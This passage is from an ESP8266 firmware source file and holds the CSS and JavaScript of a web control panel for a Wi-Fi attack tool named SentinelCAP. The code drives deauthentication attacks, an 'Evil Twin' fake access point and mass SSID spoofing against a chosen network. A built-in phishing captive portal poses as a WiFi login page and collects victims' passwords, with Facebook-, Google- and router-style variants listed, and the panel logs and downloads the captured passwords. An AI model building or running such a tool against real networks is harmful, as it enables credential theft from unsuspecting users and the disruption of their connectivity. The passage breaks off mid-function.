        display: block; /* Tampilkan tombol hamburger di mobile */
    }

    .sidebar {
        transform: translateX(-100%); /* Sembunyikan sidebar secara default di mobile */
        width: 200px; /* Smaller sidebar on mobile */
        padding-top: 60px; /* Sesuaikan padding agar tidak tumpang tindih dengan header */
    }

    .sidebar.show { /* Tampilkan ketika kelas 'show' ditambahkan */
        transform: translateX(0);
    }

    .main-content {
        margin-left: 0; /* Tidak ada margin kiri di mobile */
        padding: 80px 15px 15px; /* Smaller padding on mobile */
    }

    .status-grid {
        grid-template-columns: 1fr; /* Single column on mobile */
    }

    .header {
        padding: 0 15px; /* Sedikit padding di header mobile */
    }

    .quick-actions, .editor-controls {
        flex-direction: column;
        gap: 10px;
    }

    .action-btn {
        width: 100%;
    }

    .system-info-grid {
        grid-template-columns: 1fr;
    }

    .networks-list .network-card,
    .files-list .file-item {
        flex-direction: column;
        align-items: flex-start;
        gap: 10px;
    }

    .networks-list .network-card .details,
    .files-list .file-item .file-actions {
        width: 100%;
        text-align: left;
        margin-top: 10px;
    }

    .networks-list .network-card .select-btn,
    .files-list .file-item .action-btn {
        width: 100%;
    }

    .attack-grid {
        grid-template-columns: 1fr;
    }

    .editor-controls select,
    .editor-controls input[type="text"] {
        width: 100%;
        min-width: unset;
    }

    .template-library-grid {
        grid-template-columns: 1fr;
    }
}

/* Animations */
@keyframes fadeIn {
    from {
        opacity: 0;
        transform: translateY(20px);
    }
    to {
        opacity: 1;
        transform: translateY(0);
    }
}

@keyframes slideIn {
    from {
        opacity: 0;
        transform: translateY(-50px);
    }
    to {
        opacity: 1;
        transform: translateY(0);
    }
}

.status-card {
    animation: fadeIn 0.6s ease-out;
}

.status-card:nth-child(2) {
    animation-delay: 0.1s;
}

.status-card:nth-child(3) {
    animation-delay: 0.2s;
}

.status-card:nth-child(4) {
    animation-delay: 0.3s;
}

/* Custom scrollbar */
.sidebar::-webkit-scrollbar,
.terminal-output::-webkit-scrollbar,
.code-editor::-webkit-scrollbar,
.mass-spoofing-section textarea::-webkit-scrollbar {
    width: 6px;
}

.sidebar::-webkit-scrollbar-track,
.terminal-output::-webkit-scrollbar-track,
.code-editor::-webkit-scrollbar-track,
.mass-spoofing-section textarea::-webkit-scrollbar-track {
    background: #1a1a1a;
}

.sidebar::-webkit-scrollbar-thumb,
.terminal-output::-webkit-scrollbar-thumb,
.code-editor::-webkit-scrollbar-thumb,
.mass-spoofing-section textarea::-webkit-scrollbar-thumb {
    background: #ff3333;
    border-radius: 3px;
}

.sidebar::-webkit-scrollbar-thumb:hover,
.terminal-output::-webkit-scrollbar-thumb:hover,
.code-editor::-webkit-scrollbar-thumb:hover,
.mass-spoofing-section textarea::-webkit-scrollbar-thumb:hover {
    background: #ff5555;
}

/* Utility classes */
.flex-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 20px;
    flex-wrap: wrap;
    gap: 10px;
}

.text-red { color: #ff3333; }
.text-green { color: #00ff41; }
)rawliteral";

// script.js
const char SCRIPT_JS[] PROGMEM = R"rawliteral(
// Global state
let currentTab = 'dashboard';
let networks = [];
let selectedNetwork = null;
let isDeauthActive = false;
let isHotspotActive = false;
let isMassSpoofingActive = false; // NEW: Mass Spoofing Status
let capturedPasswords = []; // This will be fetched from ESP8266
let htmlEditorContent = ''; // Content for the textarea editor
let appSettings = {}; // New: To store fetched settings

// Initialize the application
document.addEventListener('DOMContentLoaded', function() {
    console.log("DOM Content Loaded. Initializing UI...");
    initializeUI();
    loadDefaultTemplate(); // Load default template into editor
    startStatusUpdates(); // Start polling for status
    populateTemplateLibrary(); // Populate template library
    attachEventListeners(); // Attach all event listeners
    fetchFiles(); // Fetch initial file list
    fetchLogs(); // Fetch initial logs
    scanNetworks(); // Initial network scan
    fetchSettings(); // New: Fetch settings on startup
    console.log("UI Initialization complete.");
});

// --- UI Initialization and Tab Management ---
function initializeUI() {
    console.log("initializeUI called.");
    // Set initial active tab
    showTab('dashboard');
    // No need to explicitly add 'hidden' class here.
    // The CSS @media query handles the default hidden state on mobile.
}

function showTab(tabName) {
    console.log("Showing tab: " + tabName);
    // Hide all tabs
    document.querySelectorAll('.tab-content').forEach(tab => {
        tab.classList.remove('active');
    });
    
    // Remove active class from nav items
    document.querySelectorAll('.nav-item').forEach(nav => {
        nav.classList.remove('active');
    });
    
    // Show selected tab
    document.getElementById(tabName + '-tab').classList.add('active');
    
    // Add active class to nav item
    const activeNavItem = document.querySelector(`.nav-item[data-tab="${tabName}"]`);
    if (activeNavItem) {
        activeNavItem.classList.add('active');
    }
    
    currentTab = tabName;

    // Close sidebar on mobile after selection
    if (window.innerWidth <= 768) {
        const sidebar = document.getElementById('sidebar');
        sidebar.classList.remove('show'); // Hide sidebar by removing 'show' class
        console.log("Sidebar hidden on mobile after tab selection.");
    }

    // Special handling for captive editor tab to update preview
    if (currentTab === 'captive-editor') {
        previewTemplate();
    }
    // Special handling for file manager to refresh files
    if (currentTab === 'filemanager') {
        fetchFiles();
    }
    // Special handling for logs to refresh logs
    if (currentTab === 'logs') {
        fetchLogs();
    }
    // Special handling for settings to refresh settings
    if (currentTab === 'settings') {
        fetchSettings();
    }
}

function attachEventListeners() {
    console.log("Attaching event listeners...");
    // Navigation buttons
    document.querySelectorAll('.nav-item').forEach(item => {
        item.addEventListener('click', (event) => {
            event.preventDefault(); // Prevent default link behavior
            const tabName = event.currentTarget.dataset.tab;
            if (tabName) {
                showTab(tabName);
            }
        });
    });

    // Hamburger menu toggle
    const menuToggleBtn = document.querySelector('.menu-toggle');
    if (menuToggleBtn) {
        menuToggleBtn.addEventListener('click', toggleSidebar);
        console.log("Menu toggle button event listener attached.");
    } else {
        console.error("Menu toggle button not found!");
    }

    // Dashboard Quick Actions
    document.getElementById('quick-scan-btn').addEventListener('click', () => {
        showTab('scanner');
        scanNetworks();
    });
    // document.getElementById('deselect-network-btn').addEventListener('click', deselectNetwork); // Moved to scanner tab
    document.getElementById('generate-report-btn').addEventListener('click', generateReport);

    // Scanner Tab
    document.getElementById('refresh-scan-btn').addEventListener('click', scanNetworks);
    document.getElementById('deselect-network-btn').addEventListener('click', deselectNetwork); // Event listener for moved button

    // Attack Tab
    document.getElementById('deauth-btn').addEventListener('click', toggleDeauth);
    document.getElementById('hotspot-btn').addEventListener('click', toggleHotspot);
    document.getElementById('mass-spoofing-btn').addEventListener('click', toggleMassSpoofing); // Changed ID and function

    // Captive Portal Editor Tab
    document.getElementById('load-template-btn').addEventListener('click', loadTemplate);
    document.getElementById('save-template-btn').addEventListener('click', saveTemplate);
    document.getElementById('deploy-template-btn').addEventListener('click', deployTemplate);
    document.getElementById('html-editor').addEventListener('input', debounce(previewTemplate, 500)); // Debounce input for live preview
    document.getElementById('template-select').addEventListener('change', loadTemplate); // Load template on select change

    // File Manager Tab
    document.getElementById('show-upload-modal-btn').addEventListener('click', showUploadModal);
    // Corrected ID for cancel button
    const cancelUploadBtn = document.getElementById('cancel-upload-btn');
    if (cancelUploadBtn) {
        cancelUploadBtn.addEventListener('click', closeUploadModal);
    }
    
    document.getElementById('file-input').addEventListener('change', handleFileUpload);
    document.getElementById('file-drop-area').addEventListener('click', () => document.getElementById('file-input').click());
    document.getElementById('file-drop-area').addEventListener('dragover', (e) => {
        e.preventDefault();
        e.currentTarget.classList.add('drag-over');
    });
    document.getElementById('file-drop-area').addEventListener('dragleave', (e) => {
        e.currentTarget.classList.remove('drag-over');
    });
    document.getElementById('file-drop-area').addEventListener('drop', (e) => {
        e.preventDefault();
        e.currentTarget.classList.remove('drag-over');
        const fileInput = document.getElementById('file-input');
        fileInput.files = e.dataTransfer.files;
        handleFileUpload();
    });

    // Logs Tab
    document.getElementById('clear-logs-btn').addEventListener('click', clearLogs);
    document.getElementById('download-logs-btn').addEventListener('click', downloadLogs);

    // Settings Tab
    document.getElementById('save-settings-btn').addEventListener('click', saveSettings);

    // NEW: Firmware Update Tab
    const firmwareInput = document.getElementById('firmware-input');
    const firmwareDropArea = document.getElementById('firmware-drop-area');

    if (firmwareInput && firmwareDropArea) {
        firmwareInput.addEventListener('change', handleFirmwareUpload);
        firmwareDropArea.addEventListener('click', () => firmwareInput.click());
        firmwareDropArea.addEventListener('dragover', (e) => {
            e.preventDefault();
            e.currentTarget.classList.add('drag-over');
        });
        firmwareDropArea.addEventListener('dragleave', (e) => {
            e.preventDefault();
            e.currentTarget.classList.remove('drag-over');
        });
        firmwareDropArea.addEventListener('drop', (e) => {
            e.preventDefault();
            e.currentTarget.classList.remove('drag-over');
            firmwareInput.files = e.dataTransfer.files;
            handleFirmwareUpload();
        });
    } else {
        console.error("Firmware update elements not found!");
    }


    // Reboot Button
    document.getElementById('reboot-btn').addEventListener('click', confirmReboot);
    console.log("All event listeners attached.");
}

// Toggle sidebar for mobile
function toggleSidebar() {
    console.log("toggleSidebar called.");
    const sidebar = document.getElementById('sidebar');
    sidebar.classList.toggle('show');
    console.log("Sidebar 'show' class toggled. Current classes: " + sidebar.className);
}

// --- Captive Portal Editor Functions ---
function loadDefaultTemplate() {
    const defaultTemplate = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Login - {SSID}</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
            max-width: 400px;
            width: 100%;
            text-align: center;
        }
        .wifi-icon {
            width: 80px;
            height: 80px;
            margin: 0 auto 20px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 2em;
        }
        h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 1.8em;
        }
        .subtitle {
            color: #666;
            margin-bottom: 30px;
        }
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }
        label {
            display: block;
            margin-bottom: 5px;
            color: #333;
            font-weight: 500;
        }
        input[type="password"], input[type="text"] {
            width: 100%;
            padding: 12px;
            border: 2px solid #e1e5e9;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s;
            box-sizing: border-box;
        }
        input[type="password"]:focus, input[type="text"]::focus { /* Corrected typo here */
            outline: none;
            border-color: #667eea;
        }
        .connect-btn {
            width: 100%;
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 15px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
        }
        .connect-btn:hover {
            transform: translateY(-2px);
        }
        .security-note {
            margin-top: 20px;
            font-size: 12px;
            color: #888;
        </style>
</head>
<body>
    <div class="login-container">
        <div class="wifi-icon">📶</div>
        <h1>Connect to {SSID}</h1>
        <p class="subtitle">Please enter your network password to continue</p>
        
        <form action="/submit_password" method="post">
            <div class="form-group">
                <label for="password">WiFi Password:</label>
                <input type="password" id="password" name="password" required placeholder="Enter your WiFi password">
            </div>
            
            <button type="submit" class="connect-btn">Connect to Network</button>
        </form>
        
        <p class="security-note">
            🔒 Your connection is secured with WPA2 encryption
        </p>
    </div>
</body>
</html>`;

    document.getElementById('html-editor').value = defaultTemplate;
    previewTemplate();
}

function loadTemplate() {
    const selectedTemplate = document.getElementById('template-select').value;
    let template = '';

    switch(selectedTemplate) {
        case 'facebook':
            template = getFacebookTemplate();
            break;
        case 'google':
            template = getGoogleTemplate();
            break;
        case 'router':
            template = getRouterTemplate();
            break;
        case 'default':
            loadDefaultTemplate();
            return;
        default: // Custom template from library
            const customTemplate = localStorage.getItem(`template_${selectedTemplate}`);
            if (customTemplate) {
                template = customTemplate;
            } else {
                showNotification('Template not found!', 'error');
                return;
            }
            break;
    }

    document.getElementById('html-editor').value = template;
    previewTemplate();
}

function previewTemplate() {
    let html = document.getElementById('html-editor').value;
    
    // Replace template variables
    html = html.replace(/{SSID}/g, selectedNetwork ? selectedNetwork.ssid : 'MyNetwork');
    html = html.replace(/{DEVICE_NAME}/g, 'SentinelCAP');
    html = html.replace(/{CURRENT_TIME}/g, new Date().toLocaleTimeString());
    html = html.replace(/{CUSTOM_MESSAGE}/g, 'Please authenticate to continue');

    const iframe = document.getElementById('preview-iframe');
    const doc = iframe.contentDocument || iframe.contentWindow.document;
    doc.open();
    doc.write(html);
    doc.close();
}

function saveTemplate() {
    const templateName = prompt('Enter a name for your custom template:');
    if (templateName) {
        const html = document.getElementById('html-editor').value;
        localStorage.setItem(`template_${templateName}`, html);
        addToTerminal(`[INFO] Template '${templateName}' saved successfully to local storage.`);
        populateTemplateLibrary();
        showNotification('Template saved successfully!', 'success');
    }
}

async function deployTemplate() {
    const html = document.getElementById('html-editor').value;
    const filename = 'captive_portal_template.html'; // Fixed filename for deployment

    const formData = new FormData();
    const blob = new Blob([html], { type: 'text/html' });
    formData.append('uploadFile', blob, filename);

    try {
        addToTerminal(`[INFO] Deploying template to ${filename}...`);
        const response = await fetch('/upload', {
            method: 'POST',
            body: formData
        });

        if (response.ok) {
            const result = await response.json();
            addToTerminal(`[INFO] ${result.message}`);
            showNotification('Template deployed successfully!', 'success');
        } else {
            const errorText = await response.text();
            addToTerminal(`[ERROR] Failed to deploy template: ${errorText}`);
            showNotification('Failed to deploy template!', 'error');
        }
    } catch (error) {
        addToTerminal(`[ERROR] Network error during deployment: ${error.message}`);
        showNotification('Network error during deployment!', 'error');
    }
}

function populateTemplateLibrary() {
    const library = document.getElementById('template-library');
    library.innerHTML = '';

    // Add built-in templates
    const builtinTemplates = [
        { name: 'Default', description: 'Simple and clean design' },
        { name: 'Facebook', description: 'Facebook-style login page' },
        { name: 'Google', description: 'Google WiFi style' },
        { name: 'Router', description: 'Router admin panel style' }
    ];

    builtinTemplates.forEach(template => {
        const card = createTemplateCard(template.name, template.description, false);
        library.appendChild(card);
    });

    // Add custom templates from localStorage
    Object.keys(localStorage).forEach(key => {
        if (key.startsWith('template_')) {
            const name = key.replace('template_', '');
            const card = createTemplateCard(name, 'Custom template', true);
            library.appendChild(card);
        }
    });
}

function createTemplateCard(name, description, isCustom) {
    const card = document.createElement('div');
    card.className = 'template-card';
    
    card.innerHTML = `
        <h4>${name}</h4>
        <p>${description}</p>
        <div class="template-actions">
            <button data-template-name="${name}" class="action-btn small-btn load-template-from-library-btn"><i class="fas fa-file-import"></i> Load</button>
            ${isCustom ? `<button data-template-name="${name}" class="action-btn small-btn red-btn delete-template-btn"><i class="fas fa-trash-alt"></i> Delete</button>` : ''}
        </div>
    `;
    
    // Attach event listeners to buttons within the card
    card.querySelector('.load-template-from-library-btn').addEventListener('click', (e) => {
        loadTemplateFromLibrary(e.currentTarget.dataset.templateName); // Use currentTarget
    });
    if (isCustom) {
        card.querySelector('.delete-template-btn').addEventListener('click', (e) => {
            deleteTemplate(e.currentTarget.dataset.templateName); // Use currentTarget
        });
    }
    
    return card;
}

function loadTemplateFromLibrary(name) {
    document.getElementById('template-select').value = name; // Update dropdown
    loadTemplate(); // Call loadTemplate to load the content
}

function deleteTemplate(name) {
    if (confirm(`Are you sure you want to delete template '${name}'?`)) {
        localStorage.removeItem(`template_${name}`);
        populateTemplateLibrary();
        addToTerminal(`[INFO] Template '${name}' deleted.`);
        showNotification('Template deleted!', 'success');
    }
}

// --- Network Scanning Functions ---
async function scanNetworks() {
    addToTerminal('[SCAN] Starting WiFi network scan...');
    try {
        const response = await fetch('/api/scan');
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        networks = await response.json();
        renderNetworks();
        addToTerminal(`[SCAN] Found ${networks.length} networks.`);
    } catch (error) {
        addToTerminal(`[ERROR] Failed to scan networks: ${error.message}`);
        console.error("Error scanning networks:", error);
        showNotification('Failed to scan networks!', 'error');
    }
}

function renderNetworks() {
    const networksList = document.getElementById('networks-list');
    networksList.innerHTML = '';

    if (networks.length === 0) {
        networksList.innerHTML = '<p class="text-gray">No networks found. Try refreshing the scan.</p>';
        return;
    }

    networks.forEach((network, index) => {
        const networkCard = document.createElement('div');
        // Ensure selectedNetwork is properly compared by BSSID
        networkCard.className = `network-card ${selectedNetwork && selectedNetwork.bssid === network.bssid ? 'selected' : ''}`;
        
        const signalStrength = getSignalStrength(network.rssi);
        const securityColor = network.security === 'Open' ? 'text-red' : 'text-green';
        
        networkCard.innerHTML = `
            <div class="ssid-info">
                <div class="signal-icon">${signalStrength.icon}</div>
                <div>
                    <h3>${network.ssid}</h3>
                    <p class="text-gray">${network.bssid}</p>
                </div>
            </div>
            <div class="details">
                <p class="text-gray">Ch. ${network.channel}</p>
                <p class="${securityColor}">${network.security}</p>
                <p class="text-gray">${network.rssi} dBm</p>
            </div>
            <button data-bssid="${network.bssid}" class="select-btn">
                ${selectedNetwork && selectedNetwork.bssid === network.bssid ? 'Selected' : 'Select'}
            </button>
        `;
        
        networksList.appendChild(networkCard);
    });

    // Attach event listeners to newly rendered select buttons
    networksList.querySelectorAll('.select-btn').forEach(button => {
        button.addEventListener('click', (e) => {
            const bssidToSelect = e.currentTarget.dataset.bssid; // Use currentTarget
            const networkToSelect = networks.find(net => net.bssid === bssidToSelect);
            if (networkToSelect) {
                selectNetwork(networkToSelect);
            }
        });
    });
}

function getSignalStrength(rssi) {
    if (rssi > -50) return { icon: '📶', class: 'text-green' };
    if (rssi > -60) return { icon: '📶', class: 'text-yellow' };
    if (rssi > -70) return { icon: '📶', class: 'text-orange' };
    return { icon: '📶', class: 'text-red' };
}

// --- NEW: selectNetwork function ---
async function selectNetwork(network) {
    addToTerminal(`[INFO] Attempting to select network: ${network.ssid}`);
    try {
        const response = await fetch('/api/select_network', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ bssid: network.bssid })
        });

        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        const result = await response.json();
        if (result.success) {
            selectedNetwork = network; // Update local state
            document.getElementById('target-ssid').textContent = selectedNetwork.ssid; // Update dashboard
            renderNetworks(); // Re-render to show selection highlight
            addToTerminal(`[INFO] Network '${selectedNetwork.ssid}' selected successfully.`);
            showNotification('Network selected successfully!', 'success');
        } else {
            addToTerminal(`[ERROR] Failed to select network: ${result.message}`);
            showNotification(`Failed to select network: ${result.message}`, 'error');
        }
    } catch (error) {
        addToTerminal(`[ERROR] Network error during selection: ${error.message}`);
        console.error("Error selecting network:", error);
        showNotification('Network error during selection!', 'error');
    }
}


// --- Attack Functions ---
async function toggleDeauth() {
    if (!selectedNetwork || !selectedNetwork.ssid) {
        showNotification('Please select a target network first', 'error');
        return;
    }
    // Prevent deauth if mass spoofing is active
    if (isMassSpoofingActive) {
        showNotification('Stop Mass Spoofing before starting Deauth Attack.', 'warning');
        return;
    }

    try {
        const response = await fetch('/api/toggle_deauth', { method: 'POST' });
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        const result = await response.json();
        isDeauthActive = result.deauth_active;
        updateDeauthUI();
        addToTerminal(`[DEAUTH] Deauth attack ${isDeauthActive ? 'started' : 'stopped'} on ${selectedNetwork.ssid}`);
        showNotification(`Deauth attack ${isDeauthActive ? 'started' : 'stopped'}!`, isDeauthActive ? 'success' : 'info');
    } catch (error) {
        addToTerminal(`[ERROR] Failed to toggle deauth: ${error.message}`);
        console.error("Error toggling deauth:", error);
        showNotification('Failed to toggle deauth!', 'error');
    }
}

function updateDeauthUI() {
    const btn = document.getElementById('deauth-btn');
    const status = document.getElementById('deauth-status');
    if (isDeauthActive) {
        btn.textContent = 'Stop Deauth Attack';
        btn.classList.add('red-btn');
        status.innerHTML = '<span class="text-green">Active</span>';
    } else {
        btn.textContent = 'Start Deauth Attack';
        btn.classList.remove('red-btn');
        status.innerHTML = '<span class="text-red">Stopped</span>';
    }
}

async function toggleHotspot() {
    if (!selectedNetwork || !selectedNetwork.ssid) {
        showNotification('Please select a target network first', 'error');
        return;
    }
    // Prevent hotspot if mass spoofing is active
    if (isMassSpoofingActive) {
        showNotification('Stop Mass Spoofing before starting Evil Twin.', 'warning');
        return;
    }

    try {
        const response = await fetch('/api/toggle_hotspot', { method: 'POST' });
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        const result = await response.json();
        isHotspotActive = result.hotspot_active;
        updateHotspotUI();
        addToTerminal(`[HOTSPOT] Evil Twin ${isHotspotActive ? 'started' : 'stopped'} for ${selectedNetwork.ssid}`);
        showNotification(`Evil Twin ${isHotspotActive ? 'started' : 'stopped'}!`, isHotspotActive ? 'success' : 'info');
    } catch (error) {
        addToTerminal(`[ERROR] Failed to toggle hotspot: ${error.message}`);
        console.error("Error toggling hotspot:", error);
        showNotification('Failed to toggle hotspot!', 'error');
    }
}

function updateHotspotUI() {
    const btn = document.getElementById('hotspot-btn');
    const status = document.getElementById('hotspot-status');
    if (isHotspotActive) {
        btn.textContent = 'Stop Evil Twin';
        btn.classList.add('purple-btn');
        status.innerHTML = '<span class="text-green">Active</span>';
    } else {
        btn.textContent = 'Start Evil Twin';
        btn.classList.remove('purple-btn');
        status.innerHTML = '<span class="text-red">Inactive</span>';
    }
}

// NEW: Mass Spoofing Toggle Function
async function toggleMassSpoofing() {
    const ssidListTextarea = document.getElementById('ssid-list');
    const randomMacCheckbox = document.getElementById('mass-spoofing-random-mac'); // NEW
    const channelHopCheckbox = document.getElementById('mass-spoofing-channel-hop'); // NEW
    const btn = document.getElementById('mass-spoofing-btn');
    const statusText = document.getElementById('mass-spoofing-status');

    if (isMassSpoofingActive) {
        // If active, stop it
        try {
            const response = await fetch('/api/stop_mass_spoofing', { method: 'POST' });
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            const result = await response.json();
            isMassSpoofingActive = false;
            updateMassSpoofingUI();
            addToTerminal(`[SPOOF] ${result.message}`);
            showNotification('Mass spoofing stopped!', 'info');
        } catch (error) {
            addToTerminal(`[ERROR] Failed to stop mass spoofing: ${error.message}`);
            console.error("Error stopping mass spoofing:", error);
            showNotification('Failed to stop mass spoofing!', 'error');
        }
    } else {
        // If inactive, start it
        const ssidList = ssidListTextarea.value;
        if (!ssidList.trim()) {
            showNotification('Please enter at least one SSID for mass spoofing.', 'error');
            return;
        }
        // Prevent mass spoofing if Evil Twin or Deauth is active
        if (isHotspotActive || isDeauthActive) {
            showNotification('Stop Evil Twin and Deauth Attack before starting Mass Spoofing.', 'warning');
            return;
        }

        const ssids = ssidList.split('\n').filter(ssid => ssid.trim());
        if (ssids.length === 0) {
            showNotification('Please enter valid SSIDs (one per line).', 'error');
            return;
        }

        addToTerminal(`[SPOOF] Attempting to start mass spoofing with ${ssids.length} SSIDs.`);

        try {
            const response = await fetch('/api/mass_spoofing', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    ssid_list: ssidList,
                    random_mac: randomMacCheckbox.checked, // NEW
                    channel_hop: channelHopCheckbox.checked // NEW
                })
            });
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            const result = await response.json();
            isMassSpoofingActive = result.mass_spoofing_active;
            updateMassSpoofingUI(result.current_spoofed_ssid); // Pass current SSID
            addToTerminal(`[SPOOF] ${result.message}`);
            showNotification('Mass spoofing started!', 'success');
        } catch (error) {
            addToTerminal(`[ERROR] Failed to start mass spoofing: ${error.message}`);
            console.error("Error starting mass spoofing:", error);
            showNotification('Failed to start mass spoofing!', 'error');
        }
    }
}

// NEW: Update Mass Spoofing UI
function updateMassSpoofingUI(currentSpoofedSsid = 'N/A') { // Added parameter
    const btn = document.getElementById('mass-spoofing-btn');
    const statusText = document.getElementById('mass-spoofing-status');
    const currentSpoofedSsidText = document.getElementById('current-spoofed-ssid'); // NEW

    if (isMassSpoofingActive) {
        btn.textContent = 'Stop Mass Spoofing';
        btn.classList.add('red-btn');
        btn.classList.remove('orange-btn');
        statusText.innerHTML = '<span class="text-green">Active</span>';
        currentSpoofedSsidText.textContent = `Current: ${currentSpoofedSsid}`; // Update current SSID
    } else {
        btn.textContent = 'Start Mass Spoofing';
        btn.classList.remove('red-btn');
        btn.classList.add('orange-btn');
        statusText.innerHTML = '<span class="text-red">Inactive</span>';
        currentSpoofedSsidText.textContent = 'Current: N/A'; // Reset
    }
}


// --- File Management Functions ---
function showUploadModal() {
    document.getElementById('upload-modal').style.display = 'flex';
}

function closeUploadModal() {
    document.getElementById('upload-modal').style.display = 'none';
    document.getElementById('file-input').value = ''; // Clear selected file
}

async function handleFileUpload() {
    const fileInput = document.getElementById('file-input');
    const file = fileInput.files[0];
    if (!file) {
        showNotification('No file selected!', 'warning');
        return;
    }

    const formData = new FormData();
    formData.append('uploadFile', file, file.name);

    try {
        addToTerminal(`[FILE] Uploading: ${file.name} (${file.size} bytes)`);
        const response = await fetch('/upload', {
            method: 'POST',
            body: formData
        });

        if (response.ok) {
            const result = await response.json();
            addToTerminal(`[FILE] ${result.message}`);
            showNotification('File uploaded successfully!', 'success');
            closeUploadModal();
            fetchFiles(); // Refresh file list
        } else {
            const errorText = await response.text();
            addToTerminal(`[ERROR] Failed to upload file: ${errorText}`);
            showNotification('Failed to upload file!', 'error');
        }
    } catch (error) {
        addToTerminal(`[ERROR] Network error during upload: ${error.message}`);
        showNotification('Network error during upload!', 'error');
    }
}

async function fetchFiles() {
    try {
        const response = await fetch('/api/files');
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        const files = await response.json();
        renderFiles(files);
    } catch (error) {
        addToTerminal(`[ERROR] Failed to fetch files: ${error.message}`);
        console.error("Error fetching files:", error);
        showNotification('Failed to load files!', 'error');
    }
}

function renderFiles(files) {
    const filesList = document.getElementById('files-list');
    filesList.innerHTML = '';

    if (files.length === 0) {
        filesList.innerHTML = '<p class="text-gray">No files found on device.</p>';
        return;
    }

    files.forEach(file => {
        const fileItem = document.createElement('div');
        fileItem.className = 'file-item';
        
        const fileIcon = getFileIcon(file.type);
        
        fileItem.innerHTML = `
            <div class="file-info">
                <div class="file-icon">${fileIcon}</div>
                <div class="file-details">
                    <h4>${file.name}</h4>
                    <p>${file.size} bytes</p>
                </div>
            </div>
            <div class="file-actions">
                <button data-filename="${file.name}" class="action-btn small-btn preview-file-btn"><i class="fas fa-eye"></i> Preview</button>
                <button data-filename="${file.name}" class="action-btn small-btn red-btn delete-file-btn"><i class="fas fa-trash-alt"></i> Delete</button>
            </div>
        `;
        
        filesList.appendChild(fileItem);
    });

    // Attach event listeners to newly rendered buttons
    filesList.querySelectorAll('.preview-file-btn').forEach(button => {
        button.addEventListener('click', (e) => previewFile(e.currentTarget.dataset.filename)); // Use currentTarget
    });
    filesList.querySelectorAll('.delete-file-btn').forEach(button => {
        button.addEventListener('click', (e) => deleteFile(e.currentTarget.dataset.filename)); // Use currentTarget
    });
}

function getFileIcon(type) {
    switch(type) {
        case 'html': return '<i class="fas fa-file-code"></i>';
        case 'json': return '<i class="fas fa-file-alt"></i>';
        case 'log': return '<i class="fas fa-file-alt"></i>';
        case 'javascript': return '<i class="fab fa-js"></i>';
        case 'css': return '<i class="fab fa-css3-alt"></i>';
        case 'text': return '<i class="fas fa-file-alt"></i>';
        default: return '<i class="fas fa-file"></i>';
    }
}

function previewFile(filename) {
    addToTerminal(`[FILE] Previewing: ${filename}`);
    // Open file in new tab (assuming it's a web-viewable file like HTML, CSS, JS, TXT)
    window.open(`/${filename}`, '_blank');
}

async function deleteFile(filename) {
    if (confirm(`Are you sure you want to delete ${filename}?`)) {
        try {
            const response = await fetch('/deletefile', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ filename: filename })
            });
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            const result = await response.json();
            addToTerminal(`[FILE] ${result.message}: ${filename}`);
            showNotification('File deleted successfully!', 'success');
            fetchFiles(); // Refresh file list
        } catch (error) {
            addToTerminal(`[ERROR] Failed to delete file: ${error.message}`);
            console.error("Error deleting file:", error);
            showNotification('Failed to delete file!', 'error');
        }
    }
}

// --- Log Management Functions ---
async function fetchLogs() {
    try {
        const response = await fetch('/api/logs');
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        const logs = await response.json();
        capturedPasswords = logs.passwords.split('\n').filter(line => line.trim() !== ''); // Filter empty lines
        renderPasswordLogs();
    } catch (error) {
        addToTerminal(`[ERROR] Failed to fetch logs: ${error.message}`);
        console.error("Error fetching logs:", error);
        showNotification('Failed to load logs!', 'error');
    }
}

function renderPasswordLogs() {
    const passwordLogsDiv = document.getElementById('password-logs');
    passwordLogsDiv.innerHTML = '';
    if (capturedPasswords.length === 0) {
        passwordLogsDiv.innerHTML = '<div class="text-gray">No passwords captured yet...</div>';
    } else {
        capturedPasswords.forEach(logEntry => {
            passwordLogsDiv.innerHTML += `<div>${logEntry}</div>`;
        });
    }
    passwordLogsDiv.scrollTop = passwordLogsDiv.scrollHeight;
    document.getElementById('password-count').textContent = capturedPasswords.length;
}

async function clearLogs() {
    if (confirm('Are you sure you want to clear all password logs?')) {
        try {
            const response = await fetch('/api/clear_logs', { method: 'POST' });
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            const result = await response.json();
            addToTerminal(`[INFO] ${result.message}`);
            showNotification('Password logs cleared!', 'success');
            fetchLogs(); // Refresh logs
        } catch (error) {
            addToTerminal(`[ERROR] Failed to clear logs: ${error.message}`);
            console.error("Error clearing logs:", error);
            showNotification('Failed to clear logs!', 'error');
        }
    }
}

function downloadLogs() {
    addToTerminal('[INFO] Downloading password logs...');
